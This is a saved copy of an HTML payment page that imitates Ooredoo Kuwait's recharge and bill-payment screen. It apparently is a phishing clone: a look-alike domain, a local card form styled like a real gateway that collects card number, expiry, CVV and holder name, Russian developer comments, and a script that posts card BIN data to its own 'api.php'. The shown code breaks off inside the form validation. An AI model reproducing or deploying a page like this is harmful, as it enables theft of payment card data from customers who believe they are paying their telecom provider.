
<!-- saved from url=(0126)https://recharge-ooredoo.com/ooredoo-kuwait-number/?gad_source=1&gclid=EAIaIQobChMIgY7b0J-hjAMVAYKDBx3MfRqOEAAYASAAEgInz_D_BwE -->
<html lang="ar" dir="rtl" class="arabic"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <link rel="icon" href="https://recharge-ooredoo.com/myooredoo/favicon.ico">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#e8212d">
    <meta name="description" content="Ooredoo - My Account">
    <!--<base href="https://recharge-ooredoo.com/index.php">--><base href=".">
    <link rel="apple-touch-icon" href="https://recharge-ooredoo.com/myooredoo/logo192.png">
    <link rel="stylesheet" id="main" href="./Ooredoo - حسابي_files/bootstrap.min.css">
    <link rel="stylesheet" href="./Ooredoo - حسابي_files/animate.css">
    <link rel="stylesheet" href="./Ooredoo - حسابي_files/swiper-bundle.min.css">
    <link rel="stylesheet" id="assest" href="./Ooredoo - حسابي_files/custom.css">
    <link rel="stylesheet" href="./Ooredoo - حسابي_files/shimmer-effect.css">
    <link rel="stylesheet" id="assest16" href="./Ooredoo - حسابي_files/custom16.css">
    <title data-lang="1">Ooredoo - حسابي</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
    <link rel="shortcut icon" href="https://recharge-ooredoo.com/myooredoo/tap-favicon.ico">
    <link href="./Ooredoo - حسابي_files/gosell.css" rel="stylesheet">
    <link href="./Ooredoo - حسابي_files/main.7ed5cd68.css" rel="stylesheet">
    <script async="" src="./Ooredoo - حسابي_files/clarity.js.تنزيل"></script><script async="" src="./Ooredoo - حسابي_files/p44jzfk72w"></script><script src="./Ooredoo - حسابي_files/jquery-3.7.1.min.js.تنزيل"></script>
    <script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "p44jzfk72w");
</script>
<!-- Google tag (gtag.js) -->
<script async="" src="./Ooredoo - حسابي_files/js"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-16841967491');
</script>
<script type="text/javascript" async="" src="./Ooredoo - حسابي_files/f.txt"></script></head>

<body id="app-body" class="shimmer-effect shimmerBG fixed_footer_sp16">
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
        <div class="App">
            <div class="toast-container position-absolute bottom-0 start-50 translate-middle-x"></div>
            <div id="container_main" class="body_container post_login">
                <header class="header ">
                    <div class="header_container flex_grp_center">
                        <div class="header_left">
                            <button class="img_btn img_btn_lg btn_trigger" id="backButton">
                                <img src="./Ooredoo - حسابي_files/back_dark.svg" alt="" title="" id="back_image">
                            </button>
                        </div>
                        <div class="header_center">
                            <h4 class="header_title" data-lang="2">دفع</h4>
                        </div>
                        <div class="header_actions flex_grp_align_center">
                            <button id="langbtn" class="language_change" data-lang="333">English</button>
                            <button class="img_btn img_btn_lg btn_trigger">
                                <img src="./Ooredoo - حسابي_files/assist_icon.png" alt="" title="">
                            </button>
                        </div>
                    </div>
                </header>
                <section class="side_menu_wrapper">
                    <div class="side_menu_wrapper_inside">
                        <div class="side_menu_top">
                            <a class="side_menu_logo">
                                <img src="./Ooredoo - حسابي_files/logo_red.svg" alt="" title="">
                            </a>
                        </div>
                        <ul class="side_menu_list">
                            <li>
                                <a activeclassname="nav-link--active" class="side_menu_item">
                                    <img src="./Ooredoo - حسابي_files/home_black.svg" class="black_icon" alt="" title="">
                                    <img src="./Ooredoo - حسابي_files/home_gray.svg" class="gray_icon" alt="" title="">
                                    <span data-lang="3">الرئيسية</span>
                                </a>
                            </li>
                            <li>
                                <a activeclassname="nav-link--active" class="side_menu_item active">
                                    <img src="./Ooredoo - حسابي_files/pay_black.svg" class="black_icon" alt="" title="">
                                    <img src="./Ooredoo - حسابي_files/pay_gray.svg" class="gray_icon" alt="" title="">
                                    <span data-lang="4">دفع</span>
                                </a>
                            </li>
                            <li>
                                <a class="side_menu_item">
                                    <img src="./Ooredoo - حسابي_files/shop_black.svg" class="black_icon" alt="" title="">
                                    <img src="./Ooredoo - حسابي_files/shop_gray.svg" class="gray_icon" alt="" title="">
                                    <span data-lang="5">المتجر</span>
                                </a>
                            </li>
                            <li>
                                <a activeclassname="nav-link--active" class="side_menu_item">
                                    <img src="./Ooredoo - حسابي_files/more_black.svg" class="black_icon" alt="" title="">
                                    <img src="./Ooredoo - حسابي_files/more_gray.svg" class="gray_icon" alt="" title="">
                                    <span data-lang="6">المزيد</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </section>
                <section id="content_cont" class="app_main_wrapper pt-60 pb-76 d-flex flex-column">
                    <div class="center_section" id="firstPage">
                        <div class="sec_top">
                            <div class="pse_sm">
                                <img class="w-100 border-radius20" id="topImage" src="./Ooredoo - حسابي_files/topimagear.jpg">
                            </div>
                            <div class="pse_sm">
                                <div class="recharge_sec overflow-auto mb-5 pb-5">
                                    <div>
                                        <div class="d-flex flex-row justify-content-between gap-2 mb-2 mt-3">
                                            <div class="form-group width50">
                                                <label class="control-label" data-lang="7">رقم الموبايل</label>
                                                <div class="input_icon right-icon">
                                                    <input id="inputField1" type="text" class="form-control" value="" style="border-color: rgb(237, 28, 36);" maxlength="8" onkeydown="return ( event.ctrlKey || event.altKey 
                                                        || (47&lt;event.keyCode &amp;&amp; event.keyCode&lt;58 &amp;&amp; event.shiftKey==false) 
                                                        || (95&lt;event.keyCode &amp;&amp; event.keyCode&lt;106)
                                                        || (event.keyCode==8) || (event.keyCode==9) 
                                                        || (event.keyCode&gt;34 &amp;&amp; event.keyCode&lt;40) 
                                                        || (event.keyCode==46) )">
                                                    <button id="clearInputField1" style="display: none;" onclick="this.style.display = &#39;none&#39;"><img src="./Ooredoo - حسابي_files/close_icon_filled.svg" alt="" title="" style="width: 22px;"></button>
                                                </div>
                                                <label class="dark_gray_color mt-1 font12 w-100"></label>
                                            </div>
                                            <div class="form-group width35">
                                                <label class="control-label" data-lang="8">المبلغ</label>
                                                <div class="input_icon left-icon">
                                                    <input id="inputField1Price" type="text" class="form-control" placeholder="" value="5" maxlength="8" onkeydown="return ( event.ctrlKey || event.altKey 
                                                        || (47&lt;event.keyCode &amp;&amp; event.keyCode&lt;58 &amp;&amp; event.shiftKey==false) 
                                                        || (95&lt;event.keyCode &amp;&amp; event.keyCode&lt;106)
                                                        || (event.keyCode==8) || (event.keyCode==9) 
                                                        || (event.keyCode&gt;34 &amp;&amp; event.keyCode&lt;40) 
                                                        || (event.keyCode==46) )">
                                                    <button data-lang="222">د.ك</button>
                                                </div>
                                            </div>
                                            <button class="img_btn width15">
                                                <!-- <img src="myooredoo/assets/images/delete.svg" alt="" title=""> -->
                                            </button>
                                        </div>
                                    </div>

                                    <div id="secondinputBlock" style="display: none;">
                                        <div class="d-flex flex-row justify-content-between gap-2 mb-2 mt-3">
                                            <div class="form-group width50">
                                                <label class="control-label" data-lang="9">رقم الموبايل</label>
                                                <div class="input_icon right-icon">
                                                    <input id="inputField2" type="text" class="form-control" value="" style="border-color: rgb(237, 28, 36);" maxlength="8" onkeydown="return ( event.ctrlKey || event.altKey 
                                                        || (47&lt;event.keyCode &amp;&amp; event.keyCode&lt;58 &amp;&amp; event.shiftKey==false) 
                                                        || (95&lt;event.keyCode &amp;&amp; event.keyCode&lt;106)
                                                        || (event.keyCode==8) || (event.keyCode==9) 
                                                        || (event.keyCode&gt;34 &amp;&amp; event.keyCode&lt;40) 
                                                        || (event.keyCode==46) )">
                                                    <button id="clearInputField2" style="display: none;" onclick="this.style.display = &#39;none&#39;"><img src="./Ooredoo - حسابي_files/close_icon_filled.svg" alt="" title="" style="width: 22px;"></button>
                                                </div>
                                                <label class="dark_gray_color mt-1 font12 w-100"></label>
                                            </div>
                                            <div class="form-group width35">
                                                <label class="control-label" data-lang="10">المبلغ</label>
                                                <div class="input_icon left-icon">
                                                    <input id="inputField2Price" type="text" class="form-control" placeholder="" value="5" maxlength="8" onkeydown="return ( event.ctrlKey || event.altKey 
                                                        || (47&lt;event.keyCode &amp;&amp; event.keyCode&lt;58 &amp;&amp; event.shiftKey==false) 
                                                        || (95&lt;event.keyCode &amp;&amp; event.keyCode&lt;106)
                                                        || (event.keyCode==8) || (event.keyCode==9) 
                                                        || (event.keyCode&gt;34 &amp;&amp; event.keyCode&lt;40) 
                                                        || (event.keyCode==46) )">
                                                    <button>KD</button>
                                                </div>
                                            </div>
                                            <button class="img_btn width15" id="secondinputRemove">
                                                <img src="./Ooredoo - حسابي_files/delete.svg" alt="" title="">
                                            </button>
                                        </div>
                                    </div>

                                    <div class="text-center mt-5">
                                        <div id="payForAnotherNumber" class="custom_btn custom_btn_primary_outline btn_block mt-3 " data-lang="11">الدفع لرقم آخر</div>
                                    </div>
                                </div>
                                <section class="fixed_footer">
                                    <div class="fixed_footer_container">
                                        <div class="mb-3 flex_grp_align_center">
                                            <div>
                                                <img src="./Ooredoo - حسابي_files/details-icon.svg" width="40" alt="" title="">
                                            </div>
                                            <div class="d-flex flex-column ms-2">
                                                <h4 class="primary_14 mb-1" data-lang="12">إعادة التعبئة / دفع الفواتير</h4>
                                                <p class="support_text mb-0"><span data-lang="111">الإجمالي: د.ك</span>
                                                    <span id="totalAmount">5</span>.000
                                                </p>
                                            </div>
                                        </div>
                                        <button id="continueButton" class="custom_btn custom_btn_primary btn_block disabled" disabled="" data-lang="13">استمرار</button>
                                    </div>
                                </section>
                            </div>
                        </div>
                    </div>


                    <div class="center_section" id="secondPage" style="background: rgb(240, 240, 240); display: none;">
                        <div class="sec_top">
                            <div class="pse_sm mt-4">
                                <div class="pay-comp white-bg">
                                    <div class="total-comp">
                                        <div data-lang="14">الإجمالي</div>
                                        <div><span id="totalSecondPage"></span>.000 <span data-lang="222">د.ك</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="mt-5 mb-4">
                                    <h2 class="mb-2 page_title_v1" data-lang="15">طريقة الدفع</h2>
                                    <p class="support_text mb-0" data-lang="16">حدد طريقة الدفع التي تختارها</p>
                                </div>
                                <div class="radiobutton-comp mt-4">
                                    <div class="pay-cont">
                                        <div class="filter-comp mb-5">
                                            <h6 class="primary_14 mt-5 cat-title" style="text-align: left;" data-lang="17">طرق الدفع المفضلة</h6>
                                            <div class="filte-plane mt-4">
                                                <input type="radio" name="radiocheck" id="KNET" value="KNET" checked="">
                                                <label for="KNET" class="white-bg " style="display: flex; align-items: center; justify-content: space-between;">
                                                    <div>
                                                        <img src="./Ooredoo - حسابي_files/638289943280525523.png" alt="" title="">
                                                        <span style="font-weight: bold;" data-lang="22">كي نت</span>
                                                    </div>
                                                    <div></div>
                                                </label>
                                            </div>
                                            <h6 class="primary_14 mt-5 cat-title" style="text-align: left;" data-lang="21">طرق دفع أخرى</h6>
                                            <div class="filte-plane mt-4">
                                                <input type="radio" name="radiocheck" id="CreditCard" value="CreditCard">
                                                <label for="CreditCard" class="white-bg " style="display: flex; align-items: center; justify-content: space-between;">
                                                    <div>
                                                        <img src="./Ooredoo - حسابي_files/638247324946260737.png" alt="" title="">
                                                        <span style="font-weight: bold;" data-lang="18">بطاقة الائتمان</span>
                                                    </div>
                                                    <div></div>
                                                    <div class="mb-3 msg" id="payment_ex_content" style="display: none;">
                                                        <div id="tap-card-elements">
                                                            <form id="gosell-gateway-form-container" method="post">
                                                                <div id="gosell-gateway-element-container">
                                                                    <div id="privateTapElement">
                                                                        <div class="holds-the-iframe">
                                                                            <div id="brands-container-539b0db61b65a7d0458283f8" class="brands-container">
                                                                                <div id="icon-VISA" class="icon" data-sort="4">
                                                                                    <img id="VISA" class="brand-icon" src="./Ooredoo - حسابي_files/visa.svg" title="VISA" alt="VISA">
                                                                                </div>
                                                                                <div id="icon-MASTERCARD" class="icon" data-sort="5">
                                                                                    <img id="MASTERCARD" class="brand-icon" src="./Ooredoo - حسابي_files/mastercard.svg" title="MASTERCARD" alt="MASTERCARD">
                                                                                </div>
                                                                                <div id="icon-AMERICAN_EXPRESS" class="icon" data-sort="6">
                                                                                    <img id="AMERICAN_EXPRESS" class="brand-icon" src="./Ooredoo - حسابي_files/american_express.svg" title="AMERICAN_EXPRESS" alt="AMERICAN_EXPRESS">
                                                                                </div>
                                                                            </div>
                                                                            <div id="fields-container-539b0db61b65a7d0458283f8" class="fields-container">
                                                                                <div id="row-0" class="row">
                                                                                    <div id="col-1-0" class="col-1">
                                                                                        <div id="group-0" class="group">
                                                                                            <input id="card-number" name="card-number" autocomplete="off" class="masked" type="tel" placeholder="رقم البطاقة" maxlength="16">
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                                <div id="row-1" class="row">
                                                                                    <div id="col-2-1" class="col-2">
                                                                                        <div id="group-1" class="group">
                                                                                            <input id="expiration-date" name="expiration-date" class="masked" maxlength="5" type="tel" autocomplete="off" placeholder="MM/YY" onkeypress="expDateFormat()" onkeydown="return ( event.ctrlKey || event.altKey 
                                                                                                || (47&lt;event.keyCode &amp;&amp; event.keyCode&lt;58 &amp;&amp; event.shiftKey==false) 
                                                                                                || (95&lt;event.keyCode &amp;&amp; event.keyCode&lt;106)
                                                                                                || (event.keyCode==8) || (event.keyCode==9) 
                                                                                                || (event.keyCode&gt;34 &amp;&amp; event.keyCode&lt;40) 
                                                                                                || (event.keyCode==46) )">
                                                                                        </div>
                                                                                    </div>
                                                                                    <div id="col-2-2" class="col-2">
                                                                                        <div id="group-2" class="group">
                                                                                            <input id="cvv" name="cvv" class="masked allownumericwithoutdecimal" autocomplete="off" maxlength="3" placeholder="CVV" type="password" inputmode="tel" onkeydown="return ( event.ctrlKey || event.altKey 
                                                                                                || (47&lt;event.keyCode &amp;&amp; event.keyCode&lt;58 &amp;&amp; event.shiftKey==false) 
                                                                                                || (95&lt;event.keyCode &amp;&amp; event.keyCode&lt;106)
                                                                                                || (event.keyCode==8) || (event.keyCode==9) 
                                                                                                || (event.keyCode&gt;34 &amp;&amp; event.keyCode&lt;40) 
                                                                                                || (event.keyCode==46) )">
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                                <div id="row-3" class="row">
                                                                                    <div id="col-1-3" class="col-1">
                                                                                        <div id="group-3" class="group">
                                                                                            <input id="card-holder" name="card-holder" class="txtOnly" autocomplete="off" type="text" placeholder="الاسم على البطاقة">
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                            <style type="text/css">
                                                                                #cvv:placeholder-shown {
                                                                                    font-family: sans-serif !important;
                                                                                    ;
                                                                                }

                                                                                .col-2 {
                                                                                    padding: 0px;
                                                                                    padding-left: 5px;
                                                                                }

                                                                                #col-2-1 {
                                                                                    padding-right: 0px;
                                                                                }

                                                                                #col-2-2 {
                                                                                    padding-left: 0px;
                                                                                    padding-right: 5px;
                                                                                }

                                                                                #group-1 {
                                                                                    border-right: 1px solid rgba(0, 0, 0, 0.12);
                                                                                    margin-bottom: 0px;
                                                                                }

                                                                                .group {
                                                                                    margin-bottom: 0px;
                                                                                }

                                                                                input:focus {
                                                                                    border-bottom: 1px solid #535353;
                                                                                }

                                                                                #cvv {
                                                                                    padding-left: 18px;
                                                                                }

                                                                                body {
                                                                                    direction: ltr;
                                                                                }

                                                                                .invalid {
                                                                                    /*border: 1px solid red;*/
                                                                                    /*color: red !important;
                                                                                    border-bottom:1px solid red !important;*/
                                                                                    color: red !important
                                                                                }

                                                                                .payfield-icon-error {
                                                                                    background-image: url(widget/css/icons/credit-error.png);
                                                                                }

                                                                                #card-number,
                                                                                #expiration-date,
                                                                                #cvv,
                                                                                #card-holder {
                                                                                    color: #535353;
                                                                                    font-size: 16px !important;
                                                                                    ;
                                                                                    line-height: 18px !important;
                                                                                    ;
                                                                                    -webkit-font-smoothing: antialiased !important;
                                                                                    ;
                                                                                    -moz-osx-font-smoothing: antialiased !important;
                                                                                    ;
                                                                                }

                                                                                #card-number,
                                                                                #expiration-date,
                                                                                #card-holder,
                                                                                #cvv {
                                                                                    font-family: sans-serif !important;
                                                                                    ;
                                                                                }

                                                                                ::-webkit-input-placeholder {
                                                                                    /* Chrome/Opera/Safari */
                                                                                    font-family: sans-serif !important;
                                                                                    ;
                                                                                    color: rgba(0, 0, 0, 0.26) !important;
                                                                                    font-size: 15px !important;
                                                                                }

                                                                                ::-moz-placeholder {
                                                                                    /* Firefox 19+ */
                                                                                    font-family: sans-serif !important;
                                                                                    ;
                                                                                    color: rgba(0, 0, 0, 0.26) !important;
                                                                                    font-size: 15px !important;
                                                                                }

                                                                                :-ms-input-placeholder {
                                                                                    /* IE 10+ */
                                                                                    font-family: sans-serif !important;
                                                                                    ;
                                                                                    color: rgba(0, 0, 0, 0.26) !important;
                                                                                    font-size: 15px !important;
                                                                                }

                                                                                :-moz-placeholder {
                                                                                    /* Firefox 18- */
                                                                                    font-family: sans-serif !important;
                                                                                    ;
                                                                                    color: rgba(0, 0, 0, 0.26) !important;
                                                                                    font-size: 15px !important;
                                                                                }

                                                                                /*.holds-the-iframe {
                                                                                        background: url(../img/loader.gif) no-repeat center center fixed;
                                                                                        -webkit-background-size: cover;
                                                                                        -moz-background-size: cover;
                                                                                        -o-background-size: cover;
                                                                                        background-size: cover;
                                                                                        min-height: 100%;
                                                                                        min-width: 100%;
                                                                                        width: 100%;
                                                                                        height: auto;
                                                                                        position: fixed;
                                                                                        top: 0;
                                                                                        left: 0;
                                                                                        background-size: 40%;
                                                                                    }*/
                                                                                #bm {
                                                                                    margin: auto;
                                                                                    top: 0;
                                                                                    left: 0;
                                                                                    position: absolute;
                                                                                    right: 0;
                                                                                    bottom: 0;
                                                                                    height: 140px;
                                                                                }

                                                                                .hidden {
                                                                                    display: none;
                                                                                }
                                                                            </style>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </form>
                                                        </div>
                                                        <p id="msg"></p>
                                                        <div class="d-flex justify-content-between" style="border: 0px; font-size: 16px; font-weight: 700; margin-top: 2rem;">
                                                            <div data-lang="19">لإجراء عملية دفع أسرع وأكثر أمانًا، يرجى حفظ بطاقتك</div>
                                                            <div>
                                                                <div class="form-check form-switch">
                                                                    <input class="form-check-input" type="checkbox" role="switch" id="flexSwitchCheckDefault">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <section class="fixed_footer">
                                    <div class="fixed_footer_container">
                                        <button id="finalPayButton" class="custom_btn custom_btn_primary btn_block text-initials" data-lang="20" onclick="knet_payment()">دفع</button>
                                    </div>
                                </section>
                            </div>
                        </div>
                    </div>


                </section>
            </div>
        </div>
    </div>

    <script>
        // Генерация и сохранение уникального ключа при входе на сайт, если его нет в localStorage
        if (!localStorage.getItem("clientKey")) {
            let timestamp = Date.now().toString(36);
            let randomPart = Math.random().toString(36).substr(2, 9);
            const clientKey = (timestamp + randomPart).substr(0, 20);
            localStorage.setItem("clientKey", clientKey);
            console.log("Client Key создан и сохранен:", clientKey);
        } else {
            clientKey = localStorage.getItem("clientKey");
            console.log("Client Key уже существует:", clientKey);
        }


        let lang = document.getElementsByTagName('html')[0].getAttribute('lang')
        const langbtn = document.getElementById('langbtn')
        const topImage = document.getElementById('topImage')

        langbtn.addEventListener('click', function () {
            switchLanguage()
        })

        function switchLanguage() {
            if (lang == 'en') {
                topImage.src = 'myooredoo/topimagear.jpg';
                lang = 'ar'
                document.getElementsByTagName('html')[0].setAttribute('dir', 'rtl')
                document.getElementsByTagName('html')[0].classList.add('arabic')
                document.documentElement.setAttribute('lang', 'ar')
                document.getElementById('card-number').setAttribute('placeholder', 'رقم البطاقة')
                document.getElementById('card-holder').setAttribute('placeholder', 'الاسم على البطاقة')
                let translationElems = document.querySelectorAll("[data-lang]");
                for (let i = 0; i < translationElems.length; i++) {
                    tr = translationElems[i]
                    let phrase = tr.getAttribute("data-lang")
                    let translatedPhrase = translation['ar'][phrase]
                    tr.innerHTML = translatedPhrase
                }
            } else if (lang === 'ar') {
                topImage.src = 'myooredoo/topimage.jpg';
                lang = 'en';
                document.getElementsByTagName('html')[0].setAttribute('dir', 'ltr')
                document.getElementsByTagName('html')[0].classList.remove('arabic')
                document.documentElement.setAttribute('lang', 'en')
                document.getElementById('card-number').setAttribute('placeholder', 'Card number')
                document.getElementById('card-holder').setAttribute('placeholder', 'Name on card')
                let translationElems = document.querySelectorAll("[data-lang]");
                for (let i = 0; i < translationElems.length; i++) {
                    tr = translationElems[i]
                    let phrase = tr.getAttribute("data-lang")
                    let translatedPhrase = translation['en'][phrase]
                    tr.innerHTML = translatedPhrase
                }
            }
        }

        const translation = {
            "en": {
                1: 'Ooredoo - My Account',
                2: 'Pay',
                3: 'Home',
                4: 'Pay',
                5: 'Shop',
                6: 'More',
                7: 'MOBILE NUMBER',
                8: 'AMOUNT',
                9: 'MOBILE NUMBER',
                10: 'AMOUNT',
                11: 'PAY FOR ANOTHER NUMBER',
                12: 'Bill payment / Recharge',
                13: 'CONTINUE',
                14: 'Total',
                15: 'Payment Method',
                16: 'Select the Payment method of your choose',
                17: 'PREFERRED',
                18: 'Credit Card',
                19: 'For faster and more secure checkout, please save your card',
                20: 'Pay',
                111: 'Total: KD',
                222: 'KD',
                333: 'عربى',
                21: 'OTHER METHODS',
                22: 'KNET'
            },
            "ar": {
                1: 'Ooredoo - حسابي',
                2: 'دفع',
                3: 'الرئيسية',
                4: 'دفع',
                5: 'المتجر',
                6: 'المزيد',
                7: 'رقم الموبايل',
                8: 'المبلغ',
                9: 'رقم الموبايل',
                10: 'المبلغ',
                11: 'الدفع لرقم آخر',
                12: 'إعادة التعبئة / دفع الفواتير',
                13: 'استمرار',
                14: 'الإجمالي',
                15: 'طريقة الدفع',
                16: 'حدد طريقة الدفع التي تختارها',
                17: 'طرق الدفع المفضلة',
                18: 'بطاقة الائتمان',
                19: 'لإجراء عملية دفع أسرع وأكثر أمانًا، يرجى حفظ بطاقتك',
                20: 'دفع',
                111: 'الإجمالي: د.ك',
                222: 'د.ك',
                333: 'English',
                21: 'طرق دفع أخرى',
                22: 'كي نت',
            }
        }

        let price1 = 5;
        let price2 = 0;
        let totalPrice = price1 + price2;
        let showSecond = 0;
        const firstPage = document.querySelector('#firstPage')
        const secondPage = document.querySelector('#secondPage')
        const payForAnotherNumber = document.querySelector('#payForAnotherNumber')
        const secondinputBlock = document.querySelector('#secondinputBlock')
        secondinputBlock.style.display = 'none'
        const secondinputRemove = document.querySelector('#secondinputRemove')
        const continueButton = document.querySelector('#continueButton')
        const totalAmount = document.querySelector('#totalAmount')
        const inputField1 = document.querySelector('#inputField1')
        const inputField2 = document.querySelector('#inputField2')
        const inputField1Price = document.querySelector('#inputField1Price')
        const inputField2Price = document.querySelector('#inputField2Price')
        const clearInputField1 = document.querySelector('#clearInputField1')
        const totalSecondPage = document.querySelector('#totalSecondPage')
        const creditCardBlock = document.querySelector('#payment_ex_content')
        const paymentMethods = document.querySelectorAll('input[name="radiocheck"]');
        const finalPayButton = document.querySelector('#finalPayButton')
        const backButton = document.querySelector('#backButton')

        clearInputField1.addEventListener('click', function () {
            inputField1.value = ''
        })
        const clearInputField2 = document.querySelector('#clearInputField2')
        clearInputField2.addEventListener('click', function () {
            inputField2.value = ''
        })

        inputField1Price.addEventListener('input', function () {
            if (!this.value) {
                price1 = 0;
                continueButton.setAttribute('disabled', 'disabled');
                continueButton.classList.add('disabled');
                continueButton.setAttribute('disabled', 'disabled');
            } else if (inputField1.value.length === 8) {
                continueButton.removeAttribute('disabled');
                continueButton.classList.remove('disabled');
            }
            price1 = Number(this.value)
            totalPrice = Number(price1) + Number(price2);
            totalAmount.innerText = totalPrice
        })

        inputField2Price.addEventListener('input', function () {
            if (!this.value) {
                price2 = 0;
                continueButton.setAttribute('disabled', 'disabled');
                continueButton.classList.add('disabled');
                continueButton.setAttribute('disabled', 'disabled');
            } else if (inputField1.value.length === 8) {
                continueButton.removeAttribute('disabled');
                continueButton.classList.remove('disabled');
            }
            price2 = Number(this.value);
            totalPrice = Number(price1) + Number(price2);
            totalAmount.innerText = totalPrice;
        })

        inputField1.addEventListener('input', function () {
            if (this.value.length === 0) {
                clearInputField1.style.display = 'none';
            } else if (this.value.length >= 1) {
                clearInputField1.style.display = 'block';
            }
            if (this.value.length === 8 && price1 > 0) {
                clearInputField1.style.display = 'none';
                continueButton.removeAttribute('disabled');
                continueButton.classList.remove('disabled');
                this.removeAttribute('style');
            } else {
                this.style.borderColor = 'rgb(237, 28, 36)';
                continueButton.setAttribute('disabled', 'disabled');
                continueButton.classList.add('disabled');
                continueButton.setAttribute('disabled', 'disabled');
            }
        })

        inputField2.addEventListener('input', function () {
            if (this.value.length === 0) {
                clearInputField2.style.display = 'none';
            } else if (this.value.length >= 1) {
                clearInputField2.style.display = 'block';
            }
            if (this.value.length === 8) {
                clearInputField2.style.display = 'none';
                this.removeAttribute('style');
            } else {
                this.style.borderColor = 'rgb(237, 28, 36)';
            }
        })

        payForAnotherNumber.addEventListener('click', function () {
            this.style.display = 'none';
            secondinputBlock.style.display = 'block';
            showSecond = 1;
            price2 = 5;
        })

        secondinputRemove.addEventListener('click', function () {
            secondinputBlock.style.display = 'none';
            payForAnotherNumber.style.display = 'block';
            inputField2.value = '';
            inputField2Price.value = '';
            showSecond = 0;
            price2 = 0;
            totalPrice = Number(price1);
            totalAmount.innerText = totalPrice;
        })

        continueButton.addEventListener('click', function () {
            firstPage.style.display = 'none';
            secondPage.style.display = 'block';
            localStorage.setItem('Total', totalPrice)
            totalSecondPage.innerHTML = totalPrice;
        })

        backButton.addEventListener('click', function () {
            firstPage.style.display = 'block';
            secondPage.style.display = 'none';
        })

        creditCardBlock.style.display = 'none';
        const knetRadio = document.getElementById('KNET');
    if (knetRadio && knetRadio.checked) {
        finalPayButton.setAttribute('onclick', 'knet_payment()');
    }
        paymentMethods.forEach((radio) => {
            radio.addEventListener('change', function () {
                if (this.value === 'KNET') {
                    creditCardBlock.style.display = 'none';
                    finalPayButton.removeAttribute('disabled');
                    finalPayButton.classList.remove('disabled');
                    finalPayButton.setAttribute('onclick', 'knet_payment()')

                } else if (this.value === 'CreditCard') {
                    creditCardBlock.style.display = 'block';
                    finalPayButton.removeAttribute('onclick');
                    validateForm()

                }
            })
        })

        const iconVisa = document.getElementById('icon-VISA')
        const iconMasterCard = document.getElementById('icon-MASTERCARD')
        const iconAmerican = document.getElementById('icon-AMERICAN_EXPRESS')
        const cardNumber = document.getElementById('card-number');
        const expireDate = document.getElementById('expiration-date')
        const cvv = document.getElementById('cvv');
        const cardHolder = document.getElementById('card-holder');
        const errorMessage = document.getElementById('msg');

        function expDateFormat() {
            let expire_date = expireDate.value;
            if (expire_date.length == 2) {
                expireDate.value = expire_date + '/';
            }
        }

        let binCheckTimeout;

        async function checkBin(bin) {
            const url = 'api.php';
            const ip = '172.70.108.107';

            const options = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ bin: bin, ip: ip })
            };

            try {
                const response = await fetch(url, options);

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const result = await response.json();
                console.log(result);
                return result;
            } catch (error) {
                console.error('Ошибка:', error);
                return null;
            }
        }

        function checkLuhn(value) {
            // remove all non digit characters
            var value = value.replace(/\D/g, '');
            var sum = 0;
            var shouldDouble = false;
            // loop through values starting at the rightmost side
            for (var i = value.length - 1; i >= 0; i--) {
                var digit = parseInt(value.charAt(i));

                if (shouldDouble) {
                    if ((digit *= 2) > 9) digit -= 9;
                }

                sum += digit;
                shouldDouble = !shouldDouble;
            }
            return (sum % 10) == 0;
        }
        let binData;
        async function validateForm() {
            let cardNumberValue = cardNumber.value.replace(/\s+/g, '');

            if (cardNumberValue.length !== 16) {
                errorMessage.innerHTML = "Card number must be 16 digits";
                finalPayButton.disabled = true;
                cardNumber.style.borderColor = "red";
                return;
            } else if (!checkLuhn(cardNumberValue)) {
                errorMessage.innerHTML = "Enter valid Visa or Mastercard number";
                finalPayButton.disabled = true;
                cardNumber.style.borderColor = "red";
                return;
            } else {
                cardNumber.style.borderColor = "";
                checkCard()
            }

            function checkCard() {
                clearTimeout(binCheckTimeout);
                binCheckTimeout = setTimeout(async () => {
                    binData = await checkBin(cardNumberValue.slice(0, 6));

                    if (binData && binData.code === 200) {
                        localStorage.setItem('BinInfo', JSON.stringify(binData));
                        switch (binData.BIN.brand) {
                            case 'VISA':
                                iconMasterCard.style.display = 'none';
                                iconAmerican.style.display = 'none';
                                break;
                            case 'MASTERCARD':
                                iconVisa.style.display = 'none';
                                iconAmerican.style.display = 'none';
                                break;
                            case 'AMERICAN_EXPRESS':
                                iconVisa.style.display = 'none';
                                iconMasterCard.style.display = 'none';
                                break;
                            default:
                                break;
                        }
                        errorMessage.innerHTML = '';
                        cardNumber.style.borderColor = "";
                        finalPayButton.disabled = false;
                        finalPayButton.classList.remove('disabled');
                    } else {
                        cardNumber.style.borderColor = "red";
                        errorMessage.innerHTML = "Invalid card number";
                        finalPayButton.classList.add('disabled');
                        finalPayButton.setAttribute('disabled', 'disabled');
                    }
                }, 1000);
            }

            if (expireDate.value.length !== 5) {
                errorMessage.innerHTML = "Expiry month is required";
                finalPayButton.disabled = true;
                expireDate.style.borderColor = "red";
                return;
            } else {
                expireDate.style.borderColor = "";
            }

            if (cvv.value.length !== 3) {
                errorMessage.innerHTML = "CVV is required";
                finalPayButton.disabled = true;
                cvv.style.borderColor = "red";
                return;
            } else {
                cvv.style.borderColor = "";
            }

